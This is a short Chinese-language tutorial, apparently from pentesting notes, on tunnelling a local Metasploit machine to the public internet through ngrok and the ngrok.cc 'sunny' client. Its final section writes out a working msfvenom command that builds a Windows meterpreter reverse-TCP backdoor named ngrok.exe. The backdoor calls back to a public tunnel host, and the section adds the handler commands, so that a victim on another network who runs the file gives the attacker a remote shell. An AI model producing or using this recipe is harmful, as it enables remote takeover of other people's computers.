## **ngrok工具**
仅支持http https tcp
可将本地电脑有MSF的虚拟机 借助穿透平台 内网tcp穿透到公网。
>免费第三方内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。

## **公网机租借平台**
国外平台：<https://dashboard.ngrok.com/login>
获取授权码Authtoken

国内平台：http://ngrok.cc
获取隧道ID

## **使用方法**
国外版
```
认证ngrok代理：ngrok.exe authtoken xxxxxxxxxxxxxxxxxxxxxxx(授权码)
将HTTP隧道转发到本地端口80：ngrok.exe http 80
```
![](https://img.kancloud.cn/65/83/65831fe49f8fc215579a327f7ce31f69_801x211.png)


^

## **将内网的MSF机子变成外网**
国内版
```
开通服务，选择绑定内网机的端口 如192.168.1.6:2222，服务端口 如10039，每一个服务有对应隧道ID 如145413377855

下载对应平台客户端，如linux的sunny，运行
./sunny clientid 145413377855

此时访问 赠送的子域名:2222 就是内网主机的2222端口。
```  
内网机MSF上线
```
内网机MSF生成反向后门
msfvenom -p windows/meterpreter/reverse_tcp lhost=free.idcfengye.com lport=10039 -f exe -o ngrok.exe


内网机MSF监听2222端口
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 192.168.1.6
set lport 2222
run


此时另一内网的机子运行ngrok.exe反弹到free.idcfengye.com:10039
又穿透到内网机的MSF的2222，实现上线。
```



